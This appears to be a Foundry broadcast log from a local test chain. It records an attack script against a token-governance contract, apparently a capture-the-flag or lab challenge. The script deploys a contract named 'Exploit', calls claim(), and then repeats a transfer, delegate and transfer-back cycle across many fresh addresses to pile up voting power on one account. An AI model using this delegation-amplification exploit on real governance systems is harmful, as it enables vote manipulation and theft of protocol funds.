{
  "transactions": [
    {
      "hash": null,
      "transactionType": "CREATE",
      "contractName": "Exploit",
      "contractAddress": "0xf6ea2eda65daa3413940f02ff2bf1c6b2c5d6376",
      "function": null,
      "arguments": null,
      "transaction": {
        "from": "0x3cf0172948f89d58320a8d7183108ca758d64f49",
        "gas": "0x63e87",
        "value": "0x0",
        "input": "0x608060405234801561001057600080fd5b506104bd806100206000396000f3fe608060405234801561001057600080fd5b50600436106100415760003560e01c8063437656a8146100465780639cb8a26a14610062578063f548a13e1461006c575b600080fd5b610060600480360381019061005b91906101b8565b610088565b005b61006a6100f7565b005b610086600480360381019061008191906101b8565b610110565b005b8073ffffffffffffffffffffffffffffffffffffffff166317799f3660006040518263ffffffff1660e01b81526004016100c29190610237565b600060405180830381600087803b1580156100dc57600080fd5b505af11580156100f0573d6000803e3d6000fd5b5050505050565b3073ffffffffffffffffffffffffffffffffffffffff16ff5b8060405161011d90610148565b6101279190610261565b604051809103906000f080158015610143573d6000803e3d6000fd5b505050565b61020b8061027d83390190565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006101858261015a565b9050919050565b6101958161017a565b81146101a057600080fd5b50565b6000813590506101b28161018c565b92915050565b6000602082840312156101ce576101cd610155565b5b60006101dc848285016101a3565b91505092915050565b6000819050919050565b6000819050919050565b60008160001b9050919050565b600061022161021c610217846101e5565b6101f9565b6101ef565b9050919050565b61023181610206565b82525050565b600060208201905061024c6000830184610228565b92915050565b61025b8161017a565b82525050565b60006020820190506102766000830184610252565b9291505056fe608060405234801561001057600080fd5b5060405161020b38038061020b8339818101604052810190610032919061010a565b8073ffffffffffffffffffffffffffffffffffffffff1663a9059cbb32617a696040518363ffffffff1660e01b815260040161006f929190610195565b600060405180830381600087803b15801561008957600080fd5b505af115801561009d573d6000803e3d6000fd5b50505050506101be565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006100d7826100ac565b9050919050565b6100e7816100cc565b81146100f257600080fd5b50565b600081519050610104816100de565b92915050565b6000602082840312156101205761011f6100a7565b5b600061012e848285016100f5565b91505092915050565b610140816100cc565b82525050565b6000819050919050565b6000819050919050565b6000819050919050565b600061017f61017a61017584610146565b61015a565b610150565b9050919050565b61018f81610164565b82525050565b60006040820190506101aa6000830185610137565b6101b76020830184610186565b9392505050565b603f806101cc6000396000f3fe6080604052600080fdfea2646970667358221220e10efacba5c050112419c136e738e6e155fee87d4d228fb31c4f21f6212f5f1864736f6c634300080d0033a2646970667358221220f4664726d94214323ee5e3e4e6f496e5da56c920454ecd19b669ea1eb9f464e464736f6c634300080d0033",
        "nonce": "0x0",
        "chainId": "0x7a69"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    },
    {
      "hash": null,
      "transactionType": "CALL",
      "contractName": null,
      "contractAddress": "0xcbe9c765549651217b22cebb74f548e331f4294d",
      "function": "claim()",
      "arguments": [],
      "transaction": {
        "from": "0x3cf0172948f89d58320a8d7183108ca758d64f49",
        "to": "0xcbe9c765549651217b22cebb74f548e331f4294d",
        "gas": "0x1de1b",
        "value": "0x0",
        "input": "0x4e71d92d",
        "nonce": "0x1",
        "chainId": "0x7a69"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    },
    {
      "hash": null,
      "transactionType": "CALL",
      "contractName": null,
      "contractAddress": "0xb09221660795dec127f8a6a71a622855ed696286",
      "function": "transfer(address,uint256)",
      "arguments": [
        "0xDeABeeD1567F3F58C3Cd3bcEd27b5dC9CE1C3585",
        "10000000000000000000000"
      ],
      "transaction": {
        "from": "0x3cf0172948f89d58320a8d7183108ca758d64f49",
        "to": "0xb09221660795dec127f8a6a71a622855ed696286",
        "gas": "0xffa3",
        "value": "0x0",
        "input": "0xa9059cbb000000000000000000000000deabeed1567f3f58c3cd3bced27b5dc9ce1c358500000000000000000000000000000000000000000000021e19e0c9bab2400000",
        "nonce": "0x2",
        "chainId": "0x7a69"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    },
    {
      "hash": null,
      "transactionType": "CALL",
      "contractName": null,
      "contractAddress": "0xb09221660795dec127f8a6a71a622855ed696286",
      "function": "delegate(address)",
      "arguments": [
        "0x3cf0172948f89d58320A8D7183108CA758D64F49"
      ],
      "transaction": {
        "from": "0xdeabeed1567f3f58c3cd3bced27b5dc9ce1c3585",
        "to": "0xb09221660795dec127f8a6a71a622855ed696286",
        "gas": "0x27ede",
        "value": "0x0",
        "input": "0x5c19a95c0000000000000000000000003cf0172948f89d58320a8d7183108ca758d64f49",
        "nonce": "0x0",
        "chainId": "0x7a69"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    },
    {
      "hash": null,
      "transactionType": "CALL",
      "contractName": null,
      "contractAddress": "0xb09221660795dec127f8a6a71a622855ed696286",
      "function": "transfer(address,uint256)",
      "arguments": [
        "0x3cf0172948f89d58320A8D7183108CA758D64F49",
        "10000000000000000000000"
      ],
      "transaction": {
        "from": "0xdeabeed1567f3f58c3cd3bced27b5dc9ce1c3585",
        "to": "0xb09221660795dec127f8a6a71a622855ed696286",
        "gas": "0xffa3",
        "value": "0x0",
        "input": "0xa9059cbb0000000000000000000000003cf0172948f89d58320a8d7183108ca758d64f4900000000000000000000000000000000000000000000021e19e0c9bab2400000",
        "nonce": "0x1",
        "chainId": "0x7a69"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    },
    {
      "hash": null,
      "transactionType": "CALL",
      "contractName": null,
      "contractAddress": "0xb09221660795dec127f8a6a71a622855ed696286",
      "function": "transfer(address,uint256)",
      "arguments": [
        "0x45548878129e74113De0472817c6f5Bdd62e958e",
        "10000000000000000000000"
      ],
      "transaction": {
        "from": "0x3cf0172948f89d58320a8d7183108ca758d64f49",
        "to": "0xb09221660795dec127f8a6a71a622855ed696286",
        "gas": "0xffa3",
        "value": "0x0",
        "input": "0xa9059cbb00000000000000000000000045548878129e74113de0472817c6f5bdd62e958e00000000000000000000000000000000000000000000021e19e0c9bab2400000",
        "nonce": "0x3",
        "chainId": "0x7a69"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    },
    {
      "hash": null,
      "transactionType": "CALL",
      "contractName": null,
      "contractAddress": "0xb09221660795dec127f8a6a71a622855ed696286",
      "function": "delegate(address)",
      "arguments": [
        "0x3cf0172948f89d58320A8D7183108CA758D64F49"
      ],
      "transaction": {
        "from": "0x45548878129e74113de0472817c6f5bdd62e958e",
        "to": "0xb09221660795dec127f8a6a71a622855ed696286",
        "gas": "0x1609a",
        "value": "0x0",
        "input": "0x5c19a95c0000000000000000000000003cf0172948f89d58320a8d7183108ca758d64f49",
        "nonce": "0x0",
        "chainId": "0x7a69"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    },
    {
      "hash": null,
      "transactionType": "CALL",
      "contractName": null,
      "contractAddress": "0xb09221660795dec127f8a6a71a622855ed696286",
      "function": "transfer(address,uint256)",
      "arguments": [
        "0x3cf0172948f89d58320A8D7183108CA758D64F49",
        "10000000000000000000000"
      ],
      "transaction": {
        "from": "0x45548878129e74113de0472817c6f5bdd62e958e",
        "to": "0xb09221660795dec127f8a6a71a622855ed696286",
        "gas": "0xffa3",
        "value": "0x0",
        "input": "0xa9059cbb0000000000000000000000003cf0172948f89d58320a8d7183108ca758d64f4900000000000000000000000000000000000000000000021e19e0c9bab2400000",
        "nonce": "0x1",
        "chainId": "0x7a69"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    },
    {
      "hash": null,
      "transactionType": "CALL",
      "contractName": null,
      "contractAddress": "0xb09221660795dec127f8a6a71a622855ed696286",
      "function": "transfer(address,uint256)",
      "arguments": [
        "0xA053BBcacb3474c8FEB63bC863d718Ba84649EcD",
        "10000000000000000000000"
      ],
      "transaction": {
        "from": "0x3cf0172948f89d58320a8d7183108ca758d64f49",
        "to": "0xb09221660795dec127f8a6a71a622855ed696286",
        "gas": "0xffa3",
        "value": "0x0",
        "input": "0xa9059cbb000000000000000000000000a053bbcacb3474c8feb63bc863d718ba84649ecd00000000000000000000000000000000000000000000021e19e0c9bab2400000",
        "nonce": "0x4",
        "chainId": "0x7a69"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    },
    {
      "hash": null,
      "transactionType": "CALL",
      "contractName": null,
      "contractAddress": "0xb09221660795dec127f8a6a71a622855ed696286",
      "function": "delegate(address)",
      "arguments": [
        "0x3cf0172948f89d58320A8D7183108CA758D64F49"
      ],
      "transaction": {
        "from": "0xa053bbcacb3474c8feb63bc863d718ba84649ecd",
        "to": "0xb09221660795dec127f8a6a71a622855ed696286",
        "gas": "0x1609a",
        "value": "0x0",
        "input": "0x5c19a95c0000000000000000000000003cf0172948f89d58320a8d7183108ca758d64f49",
        "nonce": "0x0",
        "chainId": "0x7a69"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    },
    {
      "hash": null,
      "transactionType": "CALL",
      "contractName": null,
      "contractAddress": "0xb09221660795dec127f8a6a71a622855ed696286",
      "function": "transfer(address,uint256)",
      "arguments": [
        "0x3cf0172948f89d58320A8D7183108CA758D64F49",
        "10000000000000000000000"
      ],
      "transaction": {
        "from": "0xa053bbcacb3474c8feb63bc863d718ba84649ecd",
        "to": "0xb09221660795dec127f8a6a71a622855ed696286",
        "gas": "0xffa3",
        "value": "0x0",
        "input": "0xa9059cbb0000000000000000000000003cf0172948f89d58320a8d7183108ca758d64f4900000000000000000000000000000000000000000000021e19e0c9bab2400000",
        "nonce": "0x1",
        "chainId": "0x7a69"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    },
    {
      "hash": null,
      "transactionType": "CALL",
      "contractName": null,
      "contractAddress": "0xb09221660795dec127f8a6a71a622855ed696286",
      "function": "transfer(address,uint256)",
      "arguments": [
        "0xdC5D8001FCef50Ef38CBe714D85EFFF1CE9c3FF3",
        "10000000000000000000000"
      ],
      "transaction": {
        "from": "0x3cf0172948f89d58320a8d7183108ca758d64f49",
        "to": "0xb09221660795dec127f8a6a71a622855ed696286",
        "gas": "0xffa3",
        "value": "0x0",
        "input": "0xa9059cbb000000000000000000000000dc5d8001fcef50ef38cbe714d85efff1ce9c3ff300000000000000000000000000000000000000000000021e19e0c9bab2400000",
        "nonce": "0x5",
        "chainId": "0x7a69"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    },
    {
      "hash": null,
      "transactionType": "CALL",
      "contractName": null,
      "contractAddress": "0xb09221660795dec127f8a6a71a622855ed696286",
      "function": "delegate(address)",
      "arguments": [
        "0x3cf0172948f89d58320A8D7183108CA758D64F49"
      ],
      "transaction": {
        "from": "0xdc5d8001fcef50ef38cbe714d85efff1ce9c3ff3",
        "to": "0xb09221660795dec127f8a6a71a622855ed696286",
        "gas": "0x1609a",
        "value": "0x0",
        "input": "0x5c19a95c0000000000000000000000003cf0172948f89d58320a8d7183108ca758d64f49",
        "nonce": "0x0",
        "chainId": "0x7a69"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    },
    {
      "hash": null,
      "transactionType": "CALL",
      "contractName": null,
      "contractAddress": "0xb09221660795dec127f8a6a71a622855ed696286",
      "function": "transfer(address,uint256)",
      "arguments": [
        "0x3cf0172948f89d58320A8D7183108CA758D64F49",
        "10000000000000000000000"
      ],
      "transaction": {
        "from": "0xdc5d8001fcef50ef38cbe714d85efff1ce9c3ff3",
        "to": "0xb09221660795dec127f8a6a71a622855ed696286",
        "gas": "0xffa3",
        "value": "0x0",
        "input": "0xa9059cbb0000000000000000000000003cf0172948f89d58320a8d7183108ca758d64f4900000000000000000000000000000000000000000000021e19e0c9bab2400000",
        "nonce": "0x1",
        "chainId": "0x7a69"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    },
    {
      "hash": null,
      "transactionType": "CALL",
      "contractName": null,
      "contractAddress": "0xb09221660795dec127f8a6a71a622855ed696286",
      "function": "transfer(address,uint256)",
      "arguments": [
        "0xDA5019A9dfFA24Ad94798C2540A202Bb14E45F97",
        "10000000000000000000000"
      ],
      "transaction": {
        "from": "0x3cf0172948f89d58320a8d7183108ca758d64f49",
        "to": "0xb09221660795dec127f8a6a71a622855ed696286",
        "gas": "0xffa3",
        "value": "0x0",
        "input": "0xa9059cbb000000000000000000000000da5019a9dffa24ad94798c2540a202bb14e45f9700000000000000000000000000000000000000000000021e19e0c9bab2400000",
        "nonce": "0x6",
        "chainId": "0x7a69"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    },
    {
      "hash": null,
      "transactionType": "CALL",
      "contractName": null,
      "contractAddress": "0xb09221660795dec127f8a6a71a622855ed696286",
      "function": "delegate(address)",
      "arguments": [
        "0x3cf0172948f89d58320A8D7183108CA758D64F49"
      ],
      "transaction": {
        "from": "0xda5019a9dffa24ad94798c2540a202bb14e45f97",
        "to": "0xb09221660795dec127f8a6a71a622855ed696286",
        "gas": "0x1609a",
        "value": "0x0",
        "input": "0x5c19a95c0000000000000000000000003cf0172948f89d58320a8d7183108ca758d64f49",
        "nonce": "0x0",
        "chainId": "0x7a69"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    },
    {
      "hash": null,
      "transactionType": "CALL",
      "contractName": null,
      "contractAddress": "0xb09221660795dec127f8a6a71a622855ed696286",
      "function": "transfer(address,uint256)",
      "arguments": [
        "0x3cf0172948f89d58320A8D7183108CA758D64F49",
        "10000000000000000000000"
      ],
      "transaction": {
        "from": "0xda5019a9dffa24ad94798c2540a202bb14e45f97",
        "to": "0xb09221660795dec127f8a6a71a622855ed696286",
        "gas": "0xffa3",
        "value": "0x0",
        "input": "0xa9059cbb0000000000000000000000003cf0172948f89d58320a8d7183108ca758d64f4900000000000000000000000000000000000000000000021e19e0c9bab2400000",
        "nonce": "0x1",
        "chainId": "0x7a69"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    },
    {
      "hash": null,
      "transactionType": "CALL",
      "contractName": null,
      "contractAddress": "0xb09221660795dec127f8a6a71a622855ed696286",
      "function": "transfer(address,uint256)",
      "arguments": [
        "0x07942AbB56D88728b17F6EF9980463dDe00F4B09",
        "10000000000000000000000"
      ],
      "transaction": {
        "from": "0x3cf0172948f89d58320a8d7183108ca758d64f49",
        "to": "0xb09221660795dec127f8a6a71a622855ed696286",
        "gas": "0xffa3",
        "value": "0x0",
        "input": "0xa9059cbb00000000000000000000000007942abb56d88728b17f6ef9980463dde00f4b0900000000000000000000000000000000000000000000021e19e0c9bab2400000",
        "nonce": "0x7",
        "chainId": "0x7a69"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    },
    {
      "hash": null,
      "transactionType": "CALL",
      "contractName": null,
      "contractAddress": "0xb09221660795dec127f8a6a71a622855ed696286",
      "function": "delegate(address)",
      "arguments": [
        "0x3cf0172948f89d58320A8D7183108CA758D64F49"
      ],
      "transaction": {
        "from": "0x07942abb56d88728b17f6ef9980463dde00f4b09",
        "to": "0xb09221660795dec127f8a6a71a622855ed696286",
        "gas": "0x1609a",
        "value": "0x0",
        "input": "0x5c19a95c0000000000000000000000003cf0172948f89d58320a8d7183108ca758d64f49",
        "nonce": "0x0",
        "chainId": "0x7a69"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    },
    {
      "hash": null,
      "transactionType": "CALL",
      "contractName": null,
      "contractAddress": "0xb09221660795dec127f8a6a71a622855ed696286",
      "function": "transfer(address,uint256)",
      "arguments": [
        "0x3cf0172948f89d58320A8D7183108CA758D64F49",
        "10000000000000000000000"
      ],
      "transaction": {
        "from": "0x07942abb56d88728b17f6ef9980463dde00f4b09",
        "to": "0xb09221660795dec127f8a6a71a622855ed696286",
        "gas": "0xffa3",
        "value": "0x0",
        "input": "0xa9059cbb0000000000000000000000003cf0172948f89d58320a8d7183108ca758d64f4900000000000000000000000000000000000000000000021e19e0c9bab2400000",
        "nonce": "0x1",
        "chainId": "0x7a69"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    },
    {
      "hash": null,
      "transactionType": "CALL",
      "contractName": null,
      "contractAddress": "0xb09221660795dec127f8a6a71a622855ed696286",
      "function": "transfer(address,uint256)",
      "arguments": [
        "0x8cc798450ba573D363448a0984De7bdB0e3Acfc8",
        "10000000000000000000000"
      ],
      "transaction": {
        "from": "0x3cf0172948f89d58320a8d7183108ca758d64f49",
        "to": "0xb09221660795dec127f8a6a71a622855ed696286",
        "gas": "0xffa3",
        "value": "0x0",
        "input": "0xa9059cbb0000000000000000000000008cc798450ba573d363448a0984de7bdb0e3acfc800000000000000000000000000000000000000000000021e19e0c9bab2400000",
        "nonce": "0x8",
        "chainId": "0x7a69"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    },
    {
      "hash": null,
      "transactionType": "CALL",
      "contractName": null,
      "contractAddress": "0xb09221660795dec127f8a6a71a622855ed696286",
      "function": "delegate(address)",
      "arguments": [
        "0x3cf0172948f89d58320A8D7183108CA758D64F49"
      ],
      "transaction": {
        "from": "0x8cc798450ba573d363448a0984de7bdb0e3acfc8",
        "to": "0xb09221660795dec127f8a6a71a622855ed696286",
        "gas": "0x1609a",
        "value": "0x0",
        "input": "0x5c19a95c0000000000000000000000003cf0172948f89d58320a8d7183108ca758d64f49",
        "nonce": "0x0",
        "chainId": "0x7a69"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    },
    {
      "hash": null,
      "transactionType": "CALL",
      "contractName": null,
      "contractAddress": "0xb09221660795dec127f8a6a71a622855ed696286",
      "function": "transfer(address,uint256)",
      "arguments": [
        "0x3cf0172948f89d58320A8D7183108CA758D64F49",
        "10000000000000000000000"
      ],
      "transaction": {
        "from": "0x8cc798450ba573d363448a0984de7bdb0e3acfc8",
        "to": "0xb09221660795dec127f8a6a71a622855ed696286",
        "gas": "0xffa3",
        "value": "0x0",
        "input": "0xa9059cbb0000000000000000000000003cf0172948f89d58320a8d7183108ca758d64f4900000000000000000000000000000000000000000000021e19e0c9bab2400000",
        "nonce": "0x1",
        "chainId": "0x7a69"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    },
    {
      "hash": null,
      "transactionType": "CALL",
      "contractName": null,
      "contractAddress": "0xb09221660795dec127f8a6a71a622855ed696286",
      "function": "transfer(address,uint256)",
      "arguments": [
        "0x58dcF8E5099E6bfb2ab76cc874aB1061117524d6",
        "10000000000000000000000"
      ],
      "transaction": {
        "from": "0x3cf0172948f89d58320a8d7183108ca758d64f49",
        "to": "0xb09221660795dec127f8a6a71a622855ed696286",
        "gas": "0xffa3",
        "value": "0x0",
        "input": "0xa9059cbb00000000000000000000000058dcf8e5099e6bfb2ab76cc874ab1061117524d600000000000000000000000000000000000000000000021e19e0c9bab2400000",
        "nonce": "0x9",
        "chainId": "0x7a69"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    },
    {
      "hash": null,
      "transactionType": "CALL",
      "contractName": null,
      "contractAddress": "0xb09221660795dec127f8a6a71a622855ed696286",
      "function": "delegate(address)",
      "arguments": [
        "0x3cf0172948f89d58320A8D7183108CA758D64F49"
      ],
      "transaction": {
        "from": "0x58dcf8e5099e6bfb2ab76cc874ab1061117524d6",
        "to": "0xb09221660795dec127f8a6a71a622855ed696286",
        "gas": "0x1609a",
        "value": "0x0",
        "input": "0x5c19a95c0000000000000000000000003cf0172948f89d58320a8d7183108ca758d64f49",
        "nonce": "0x0",
        "chainId": "0x7a69"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    },
    {
      "hash": null,
      "transactionType": "CALL",
      "contractName": null,
      "contractAddress": "0xb09221660795dec127f8a6a71a622855ed696286",
      "function": "transfer(address,uint256)",
      "arguments": [
        "0x3cf0172948f89d58320A8D7183108CA758D64F49",
        "10000000000000000000000"
      ],
      "transaction": {
        "from": "0x58dcf8e5099e6bfb2ab76cc874ab1061117524d6",
        "to": "0xb09221660795dec127f8a6a71a622855ed696286",
        "gas": "0xffa3",
        "value": "0x0",
        "input": "0xa9059cbb0000000000000000000000003cf0172948f89d58320a8d7183108ca758d64f4900000000000000000000000000000000000000000000021e19e0c9bab2400000",
        "nonce": "0x1",
        "chainId": "0x7a69"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    },
    {
      "hash": null,
      "transactionType": "CALL",
      "contractName": null,
      "contractAddress": "0xb09221660795dec127f8a6a71a622855ed696286",
      "function": "transfer(address,uint256)",
      "arguments": [
        "0x662Aa1dC21c8067De2f5e2D30dDcC56a7A7a02D8",
        "10000000000000000000000"
      ],
      "transaction": {
        "from": "0x3cf0172948f89d58320a8d7183108ca758d64f49",
        "to": "0xb09221660795dec127f8a6a71a622855ed696286",
        "gas": "0xffa3",
        "value": "0x0",
        "input": "0xa9059cbb000000000000000000000000662aa1dc21c8067de2f5e2d30ddcc56a7a7a02d800000000000000000000000000000000000000000000021e19e0c9bab2400000",
        "nonce": "0xa",
        "chainId": "0x7a69"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    },
    {
      "hash": null,
      "transactionType": "CALL",
      "contractName": null,
      "contractAddress": "0xb09221660795dec127f8a6a71a622855ed696286",
      "function": "delegate(address)",
      "arguments": [
        "0x3cf0172948f89d58320A8D7183108CA758D64F49"
      ],
      "transaction": {
        "from": "0x662aa1dc21c8067de2f5e2d30ddcc56a7a7a02d8",
        "to": "0xb09221660795dec127f8a6a71a622855ed696286",
        "gas": "0x1609a",
        "value": "0x0",
        "input": "0x5c19a95c0000000000000000000000003cf0172948f89d58320a8d7183108ca758d64f49",
        "nonce": "0x0",
        "chainId": "0x7a69"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    },
    {
      "hash": null,
      "transactionType": "CALL",
      "contractName": null,
      "contractAddress": "0xb09221660795dec127f8a6a71a622855ed696286",
      "function": "transfer(address,uint256)",
      "arguments": [
        "0x3cf0172948f89d58320A8D7183108CA758D64F49",
        "10000000000000000000000"
      ],
      "transaction": {
        "from": "0x662aa1dc21c8067de2f5e2d30ddcc56a7a7a02d8",
        "to": "0xb09221660795dec127f8a6a71a622855ed696286",
        "gas": "0xffa3",
        "value": "0x0",
        "input": "0xa9059cbb0000000000000000000000003cf0172948f89d58320a8d7183108ca758d64f4900000000000000000000000000000000000000000000021e19e0c9bab2400000",
        "nonce": "0x1",
        "chainId": "0x7a69"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    },
    {
      "hash": null,
      "transactionType": "CALL",
      "contractName": null,
      "contractAddress": "0xb09221660795dec127f8a6a71a622855ed696286",
      "function": "transfer(address,uint256)",
      "arguments": [
        "0xf2c34313131A0493042651956676f6B6063013a9",
        "10000000000000000000000"
      ],
      "transaction": {
        "from": "0x3cf0172948f89d58320a8d7183108ca758d64f49",
        "to": "0xb09221660795dec127f8a6a71a622855ed696286",
        "gas": "0xffa3",
        "value": "0x0",
        "input": "0xa9059cbb000000000000000000000000f2c34313131a0493042651956676f6b6063013a900000000000000000000000000000000000000000000021e19e0c9bab2400000",
        "nonce": "0xb",
        "chainId": "0x7a69"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    },
    {
      "hash": null,
      "transactionType": "CALL",
      "contractName": null,
      "contractAddress": "0xb09221660795dec127f8a6a71a622855ed696286",
      "function": "delegate(address)",
      "arguments": [
        "0x3cf0172948f89d58320A8D7183108CA758D64F49"
      ],
      "transaction": {
        "from": "0xf2c34313131a0493042651956676f6b6063013a9",
        "to": "0xb09221660795dec127f8a6a71a622855ed696286",
        "gas": "0x1609a",
        "value": "0x0",
        "input": "0x5c19a95c0000000000000000000000003cf0172948f89d58320a8d7183108ca758d64f49",
        "nonce": "0x0",
        "chainId": "0x7a69"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    },
    {
      "hash": null,
      "transactionType": "CALL",
      "contractName": null,
      "contractAddress": "0xb09221660795dec127f8a6a71a622855ed696286",
      "function": "transfer(address,uint256)",
      "arguments": [
        "0x3cf0172948f89d58320A8D7183108CA758D64F49",
        "10000000000000000000000"
      ],
      "transaction": {
        "from": "0xf2c34313131a0493042651956676f6b6063013a9",
        "to": "0xb09221660795dec127f8a6a71a622855ed696286",
        "gas": "0xffa3",
        "value": "0x0",
        "input": "0xa9059cbb0000000000000000000000003cf0172948f89d58320a8d7183108ca758d64f4900000000000000000000000000000000000000000000021e19e0c9bab2400000",
        "nonce": "0x1",
        "chainId": "0x7a69"
      },
      "additionalContracts": [],
      "isFixedGasLimit": false
    }
  ],
  "receipts": [],
  "libraries": [],
  "pending": [],
  "returns": {},
  "timestamp": 1737942051,
  "chain": 31337,
  "commit": null
}